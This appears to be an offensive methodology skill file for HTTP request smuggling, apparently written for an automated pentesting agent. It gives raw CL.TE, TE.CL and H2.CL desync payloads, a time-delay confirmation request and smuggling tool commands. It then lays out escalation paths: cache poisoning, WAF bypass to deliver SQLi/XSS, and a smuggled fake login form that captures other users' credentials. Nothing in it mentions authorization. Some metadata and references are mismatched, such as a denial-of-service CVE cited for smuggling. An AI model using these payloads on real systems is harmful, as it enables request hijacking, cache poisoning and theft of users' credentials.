---
name: web-31-http-smuggling
sequence: web-31
category: ssrf
domain: web
description: "HTTP request smuggling testing: CL.TE, TE.CL, H2.CL, H2.TE desync attacks, connection-pool poisoning, cache poisoning via smuggling, and WAF bypass via desync. Use when testing CDN/proxy-fronted applications with HTTP/1.1 or HTTP/2."
wordlist_ref: "wordlists/web/web-39-http-smuggling/"
---

# HTTP Request Smuggling — Web Offensive Methodology

## Quick Workflow

1. Identify proxy/reverse-proxy frontend (CDN, load balancer, WAF)
2. Test CL.TE: send CL + TE headers — frontend uses CL, backend uses TE
3. Test TE.CL: opposite — frontend uses TE, backend uses CL
4. Test H2.CL and H2.TE: HTTP/2 downgrade smuggling
5. Confirm via time-delay: smuggled request with 30s timeout → slow response on next request
6. Escalate: cache poisoning, credential theft, WAF bypass

---

## Detection

### CL.TE — Frontend uses Content-Length, Backend uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL — Frontend uses Transfer-Encoding, Backend uses Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 11

x=1
0
```

### H2.CL — HTTP/2 downgrade to HTTP/1.1

```http
:method POST
:path /
content-length: 0

POST /admin HTTP/1.1
Host: internal
Content-Length: 10

x=1
```

---

## Confirmation

### Time-Delay Technique

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5b
POST /timeout HTTP/1.1
Host: target.com
Content-Length: 25

x=1
0
```

If next victim request is slow (30s timeout from smuggled GET) → smuggling confirmed.

---

## Tools

- **Burp HTTP Request Smuggler** extension
- **smuggler.py** — `python3 smuggler.py -u https://target.com`
- **h2csmuggler** — `python3 h2csmuggler.py -x https://target.com`

---





## Hacker Mindset

**HTTP smuggling is a protocol desync.** You're not hacking the application — you're hacking the proxy. CL.TE and TE.CL abuse disagreement between frontend and backend about where one request ends and the next begins.

**Time-delay confirmation is the gold standard.** Send a smuggled request with a 30s timeout. If the next request is delayed by 30s, smuggling works.

**HTTP/2 makes smuggling worse.** H2.CL and H2.TE bypass most WAFs because the HTTP/2 parser doesn't expect HTTP/1.1 desync attacks.



## Chaining & Escalation

### Smuggling → Cache Poisoning
Smuggle a request that gets cached for the next victim. The poisoned cache entry serves attacker-controlled content.

### Smuggling → WAF Bypass
Smuggled requests bypass the frontend WAF entirely. Fire SQLi/XSS payloads in smuggled POST bodies.

### Smuggling → Credential Hijacking
Smuggle a fake login form that captures credentials from the next user.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-39-http-smuggling/`

**Files**:
- `wordlists/web/web-39-http-smuggling/payloads/http_smuggling/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- PortSwigger HTTP Request Smuggling research (James Kettle)
- CVE-2023-44487 (HTTP/2 Rapid Reset), CVE-2024-22021 (H2.TE)
